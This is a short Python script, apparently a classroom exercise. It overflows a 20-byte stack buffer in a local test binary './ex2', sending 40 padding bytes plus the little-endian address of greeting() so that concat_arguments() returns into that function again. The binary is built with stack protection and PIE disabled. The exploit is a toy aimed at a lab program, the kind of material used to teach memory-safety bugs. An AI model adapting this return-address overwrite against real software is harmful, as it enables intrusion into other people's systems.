#!/usr/bin/python3
# wrapper -- craft an argument that overflows buf[] in concat_arguments()
# so that concat_arguments() returns into greeting() a second time.

import os

# gcc 11.4 (-fno-stack-protector -no-pie): return address sits 40 bytes
# above &buf[0] (20-byte buf + padding + 8-byte saved rbp).
buff = 40 * (b'x')

addr = bytearray.fromhex("4011b6")   # &greeting from: objdump -d ex2 | grep greeting
addr.reverse()                        # little-endian

buff += addr
print("exec ./ex2 with buff", buff)
os.execv('./ex2', ['./ex2', buff])
